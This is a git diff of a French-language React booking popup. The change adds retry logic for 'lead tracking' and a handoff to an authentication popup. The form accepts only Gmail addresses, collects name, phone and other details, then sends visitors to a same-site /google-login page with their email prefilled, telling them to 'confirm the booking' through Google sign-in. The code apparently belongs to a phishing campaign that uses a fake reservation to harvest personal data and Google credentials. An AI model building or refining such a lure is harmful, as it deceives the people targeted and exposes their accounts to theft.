@@ -2,10 +2,15 @@ import React, { useEffect, useState } from 'react';
 import { useLeadTracker } from '../../hooks/useLeadTracker';
 import styles from '../../styles/modules/Popup.module.css';
 
-const BookingPopup = ({ showPopup, onClose, campaignData }) => {
+const BookingPopup = ({ showPopup, isVisible, onClose, onSwitch, campaignData }) => {
+  // Compatibilité avec les deux systèmes de props
+  const visible = showPopup || isVisible;
+  
   const [emailError, setEmailError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showConfirmation, setShowConfirmation] = useState(false);
+  const [trackingError, setTrackingError] = useState(null);
+  const [retryAttempts, setRetryAttempts] = useState(0);
   
   // Hook pour le tracking des leads
   const { trackBooking, isTracking } = useLeadTracker();
@@ -29,6 +34,46 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
     }
   };
 
+  const handleTrackingWithRetry = async (leadData, maxAttempts = 3) => {
+    let lastError = null;
+    
+    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+      try {
+        await trackBooking(leadData);
+        setTrackingError(null);
+        return true;
+      } catch (error) {
+        lastError = error;
+        console.warn(`Tentative ${attempt}/${maxAttempts} échouée:`, error);
+        
+        if (attempt < maxAttempts) {
+          // Attendre avant de retry (délai progressif)
+          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+        }
+      }
+    }
+    
+    setTrackingError(lastError);
+    return false;
+  };
+
+  const proceedToAuth = (email, firstName, lastName) => {
+    // Utiliser onSwitch pour passer à la popup d'authentification
+    if (onSwitch) {
+      onSwitch('auth', {
+        campaignData: {
+          ...campaignData,
+          firstName,
+          lastName,
+          email
+        }
+      });
+    } else {
+      // Fallback si onSwitch n'est pas disponible
+      window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
+    }
+  };
+
   const handleFormSubmit = async (e) => {
     e.preventDefault();
     const formData = new FormData(e.target);
@@ -39,45 +84,39 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
     const description = formData.get('description');
     
     if (!validateGmailAddress(email)) {
-      // setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
       return;
     }
     
     setIsSubmitting(true);
+    setTrackingError(null);
     
-    try {
-      // Tracker le booking avant de procéder
-      await trackBooking({
-        email,
-        firstName,
-        lastName,
-        phone,
-        description
-      });
-      
-      // Afficher l'état de confirmation
-      setShowConfirmation(true);
-      
-      // Rediriger après 5 secondes vers la même page (sans nouvel onglet)
-      setTimeout(() => {
-        // Rediriger vers la page de login Google dans la même fenêtre
-        window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
-      }, 5000);
-      
-    } catch (error) {
-      console.error('Erreur lors du tracking du booking:', error);
-      // Continuer même si le tracking échoue
-      setShowConfirmation(true);
-      
-      setTimeout(() => {
-        window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
-      }, 3000);
+    // Afficher l'état de confirmation immédiatement
+    setShowConfirmation(true);
+    
+    // Tenter le tracking avec retry
+    const trackingSuccess = await handleTrackingWithRetry({
+      email,
+      firstName,
+      lastName,
+      phone,
+      description
+    });
+    
+    if (trackingSuccess) {
+      console.log('✅ Tracking réussi, passage à l\'authentification');
+    } else {
+      console.warn('⚠️ Tracking échoué après plusieurs tentatives, mais on continue');
     }
+    
+    // Passer à la popup AUTH après 2 secondes
+    setTimeout(() => {
+      proceedToAuth(email, firstName, lastName);
+    }, 2000);
   };
 
   // Désactiver le scroll quand la popup est ouverte
   useEffect(() => {
-    if (showPopup) {
+    if (visible) {
       document.body.style.overflow = 'hidden';
     } else {
       document.body.style.overflow = 'unset';
@@ -87,9 +126,9 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
     return () => {
       document.body.style.overflow = 'unset';
     };
-  }, [showPopup]);
+  }, [visible]);
 
-  if (!showPopup) return null;
+  if (!visible) return null;
 
   return (
     <div className={styles.popupOverlay} onClick={handlePopupClick} data-popup="true">
@@ -107,8 +146,13 @@ const BookingPopup = ({ showPopup, onClose, campaignData }) => {
               <p className={styles.confirmationText}>
                 Utilisez l'invite de connexion Google pour confirmer votre réservation.
               </p>
+              {trackingError && (
+                <p className={styles.trackingWarning}>
+                  ⚠️ Réservation enregistrée mais synchronisation en cours...
+                </p>
+              )}
               <p className={styles.confirmationSubtext}>
-                Un nouvel onglet va s'ouvrir automatiquement...
+                Redirection automatique en cours...
               </p>
             </div>
           </div>
